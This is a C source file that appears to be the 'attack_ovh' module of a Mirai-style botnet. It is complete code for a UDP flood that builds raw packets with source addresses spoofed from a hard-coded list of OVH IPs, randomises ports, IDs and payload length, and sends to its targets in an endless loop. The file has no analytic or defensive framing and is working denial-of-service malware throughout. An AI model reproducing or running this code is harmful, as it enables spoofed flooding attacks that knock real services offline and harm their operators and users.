#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "util.h"
#include "checksum.h"
#include "rand.h"

#define OVH_PHI 0xaaf219b9

static unsigned long int ovh_Q[4096], ovh_c = 362436;

static void ovh_srand(unsigned long int x)
{
    int i;
    ovh_Q[0] = x;
    ovh_Q[1] = x + OVH_PHI;
    ovh_Q[2] = x + OVH_PHI + OVH_PHI;
    for (i = 3; i < 4096; i++)
        ovh_Q[i] = ovh_Q[i - 3] ^ ovh_Q[i - 2] ^ OVH_PHI ^ i;
}

static unsigned long int ovh_rand(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * ovh_Q[i] + ovh_c;
    ovh_c = (t >> 32);
    x = t + ovh_c;
    if (x < ovh_c)
    {
        x++;
        ovh_c++;
    }
    return (ovh_Q[i] = r - x);
}

void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char datagram[1518];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(iph + 1);
    
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 128);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);

    if (data_len > 1400)
        data_len = 1400;
    if (data_len < 100)
        data_len = 100;

    // Large pool of OVH source IPs for spoofing (already in network byte order)
    uint32_t ovh_ips[] = {
        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369,
        3639549962, 2728310654, 3256452616, 3561573700, 2918529833, 2890221130,
        2918997764, 2453837834, 3369835018, 3256452681, 3007103780, 1137178634,
        3264375402, 3229415686, 2728310653, 3627732067, 2890220626, 1137178635,
        3391077889, 1745910533, 1755074592, 16843009, 1092011777, 3223532318,
        2918529914, 621985916, 2728287341, 1191626519, 2890184316, 1822618132,
        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369
    };
    int num_ovh_ips = sizeof(ovh_ips) / sizeof(ovh_ips[0]);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
#endif
        close(fd);
        return;
    }

    ovh_srand(time(NULL));
    memset(datagram, 0, sizeof(datagram));

    // Setup IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = ip_tos;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
    iph->id = 0;
    iph->frag_off = 0;
    iph->ttl = ip_ttl;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = LOCAL_ADDR;

    // Setup UDP header
    udph->source = htons(rand_next() % 65535);
    udph->dest = htons(dport);
    udph->len = htons(sizeof(struct udphdr) + data_len);
    udph->check = 0;

    // Pre-generate random payload
    char payload[1400];
    for (i = 0; i < (int)sizeof(payload); i++)
        payload[i] = rand_next() & 0xff;

    int sent = 0;
    int sleeptime = 100;

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct sockaddr_in sin;

            sin.sin_family = AF_INET;
            sin.sin_addr.s_addr = targs[i].addr;
            sin.sin_port = htons(dport);

            // Randomize source IP from OVH pool
            iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];

            // Randomize source port
            udph->source = htons((ovh_rand() & 0xffff) % 65535);

            // Randomize payload (vary length)
            int pkt_len = data_len;
            if (ovh_rand() % 2 == 0)
                pkt_len = data_len / 2;
            if (pkt_len < 64) pkt_len = 64;

            util_memcpy((void *)udph + sizeof(struct udphdr), payload, pkt_len);
            udph->len = htons(sizeof(struct udphdr) + pkt_len);

            // Update IP header
            iph->id = htons(ovh_rand() & 0xffff);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + pkt_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            sendto(fd, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));

            sent++;
            if (pps_limiter > 0 && sent >= pps_limiter)
            {
                sent = 0;
                usleep(sleeptime * 10);
            }
        }
    }
}
